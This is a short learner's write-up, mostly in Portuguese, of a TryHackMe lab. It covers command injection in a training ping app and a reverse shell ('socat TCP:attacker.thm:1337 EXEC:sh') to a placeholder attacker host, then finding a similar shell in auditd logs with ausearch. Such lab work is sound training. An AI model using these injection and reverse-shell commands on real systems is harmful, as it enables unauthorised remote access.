@@ -1,0 +1,19 @@
+Run 127.0.0.1 && whoami in the TryPingMe web app.
+What output do you see after the ping results?
+
+Foi uma task super facil eu entrei no TryPingMe que foi uma plataforma que a TryHackme nos disponibilizou e usei o comando 
+127.0.0.1 && whoami
+
+Now try spawning a reverse shell to the imaginary "attacker.thm" address.
+Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app.
+What is the flag returned in the TryPingMe response?
+
+Novamente entrei na TryPingMe e rodei o comando pegando a flag 
+
+Now look at the exported auditd logs at /home/ubuntu/scenario.
+Which IP spawned a similar reverse shell via the TryPingMe app?
+
+Esse foi super facil tambem quando dei o ausearch ausearch -i -if /home/ubuntu/scenario/audit.log  a primeira vez eu dei o | grep proctitle
+na segunda vez e o ip estava lá 10.14.105.255.
+
+OBS: Essa task foi feita no dia 26/08/2026. Estou curioso para saber o que vou aprender nessa room 
